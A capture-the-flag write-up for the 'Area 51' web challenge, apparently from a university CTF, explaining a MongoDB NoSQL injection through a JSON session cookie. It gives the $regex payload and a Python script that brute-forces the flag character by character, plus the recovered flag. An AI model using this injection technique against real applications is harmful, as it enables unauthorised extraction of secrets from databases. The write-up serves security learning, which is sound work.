# Area 51
## Description
Area51 Raid Luxury Consultation Services

https://area51.chall.pwnoh.io
## Author
rene
## Resources
`dist.zip` - source code
## Solution
0. By auditing the source code, we can find that program use `mongodb` to communicate with database (so-call `nosql`).
1. Then there are two places we can try to do `nosql injection`: under `api/login` and `/`.
2. Due to the restriction of `if (username && password && typeof username === 'string' && typeof password === 'string') {`, we can't do injection in here.
3. However under `/`, there is no restriction. Therefore, we can pass `{"token": {"$regex": "^bctf{"}}` to `session` in order to leak the flag char by char (If the regex hit, the router will redirect us to `dashborard`, if not, we will go to `index`). [reference in hackertricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection#extract-data-information)
4. Done!  

final solve script:  
```python
import requests, json
from string import digits, ascii_letters

# add payload as session cookie
s = requests.Session()
flag = "bctf{"
while not flag.endswith("}"):
    found = False
    for i in digits + ascii_letters + "_{}":
        s.cookies["session"] = json.dumps({"token": {"$regex":  "^" + flag +i}})
        print(s.cookies["session"])
        r = s.get("https://area51.chall.pwnoh.io/")
        if "Pardon our dust" in r.text:
            # if redirected to dashboard
            flag += i
            found = True
            break
        elif not "Area51 Luxury Services" in r.text:
            # if not redirected to index, it maybe some UB on server (e.g. rate limit or server dead).
            print(flag)
            print(r.text)
            raise Exception("Error")
    if not found:
        print("Panic!!! not found flag")
        break
# {"token": {"$regex": "^bctf{tH3yR3_Us1nG_Ch3M1CaS_T0_MaK3_Th3_F0gS_GAy}"}}
# bctf{tH3yR3_Us1nG_Ch3M1CaS_T0_MaK3_Th3_F0gS_GAy}
print(flag)
```